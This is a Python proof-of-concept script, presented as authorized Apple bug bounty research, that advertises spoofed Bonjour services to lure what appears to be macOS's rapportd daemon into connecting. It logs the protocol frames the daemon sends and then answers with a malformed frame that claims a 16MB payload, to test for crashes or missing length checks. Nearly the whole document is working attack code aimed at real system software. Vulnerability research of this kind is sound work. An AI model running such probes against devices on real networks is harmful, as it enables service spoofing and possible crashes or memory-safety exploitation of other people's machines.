#!/usr/bin/env python3
"""
rapportd _rdlink._tcp PoC Probe
Tests whether rapportd connects to arbitrary Bonjour services and captures the frame format.
Apple Bug Bounty research - authorized testing only.
"""
import socket
import threading
import time
import subprocess
import sys

received_data = []
connections_seen = []

def hex_dump(data, prefix='  '):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join('%02x' % b for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print('%s%04x: %-48s  %s' % (prefix, i, hex_part, ascii_part))

def handle_conn(conn, addr):
    print('[+] TCP connection from %s:%d' % addr, flush=True)
    connections_seen.append(addr)
    try:
        conn.settimeout(8)
        data = conn.recv(8192)
        if data:
            print('[+] Received %d bytes initial data:' % len(data), flush=True)
            hex_dump(data)
            received_data.append(('tcp', addr, data))
            # Parse first 4 bytes as length (big-endian)
            if len(data) >= 4:
                claimed_len = (data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3]
                print('[+] Parsed length field: 0x%08x (%d)' % (claimed_len, claimed_len), flush=True)
                if len(data) >= 5:
                    print('[+] Frame type byte: 0x%02x' % data[4], flush=True)
            # Send malformed frame: claim 0xFFFFFF byte payload but only send 4 bytes
            # This tests if rapportd validates length before allocating/reading
            malformed = bytes([0x00, 0xFF, 0xFF, 0xFF, 0x01, 0x00, 0x00, 0x00])
            conn.sendall(malformed)
            print('[+] Sent malformed oversized-length frame (claims 16MB payload)', flush=True)
            time.sleep(3)
            try:
                resp = conn.recv(4096)
                if resp:
                    print('[+] Response after malformed: %d bytes' % len(resp), flush=True)
                    hex_dump(resp)
                else:
                    print('[+] Connection closed after malformed frame (possible crash/disconnect)', flush=True)
            except Exception as e:
                print('[+] Read error after malformed: %s' % e, flush=True)
    except Exception as e:
        print('[+] Connection ended: %s' % e, flush=True)
    finally:
        conn.close()

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', 9999))
    srv.listen(10)
    srv.settimeout(1)
    print('[+] TCP listener on port 9999', flush=True)

    dns_procs = []
    # Advertise all three service types rapportd browses for
    dns_procs.append(subprocess.Popen(
        ['dns-sd', '-R', 'TestRapportMirror', '_rdlink._tcp', 'local', '9999', 'rpfl=0'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
    dns_procs.append(subprocess.Popen(
        ['dns-sd', '-R', 'TestCompLink', '_companion-link._tcp', 'local', '9999', 'rpfl=0'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
    dns_procs.append(subprocess.Popen(
        ['dns-sd', '-R', 'TestIdentSvc', '_identityservice._tcp', 'local', '9999'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    print('[+] Advertising _rdlink._tcp, _companion-link._tcp, _identityservice._tcp on port 9999', flush=True)

    end_time = time.time() + 35
    while time.time() < end_time:
        try:
            conn, addr = srv.accept()
            t = threading.Thread(target=handle_conn, args=(conn, addr))
            t.daemon = True
            t.start()
        except socket.timeout:
            pass

    for p in dns_procs:
        p.terminate()
    srv.close()

    print('', flush=True)
    print('=== RESULTS ===', flush=True)
    print('Total connections: %d' % len(connections_seen), flush=True)
    print('Total data received: %d bytes' % sum(len(d[2]) for d in received_data), flush=True)
    if connections_seen:
        print('SUCCESS: rapportd connected to our service!', flush=True)
    else:
        print('No connections - rapportd requires paired device or different trigger', flush=True)

if __name__ == '__main__':
    main()
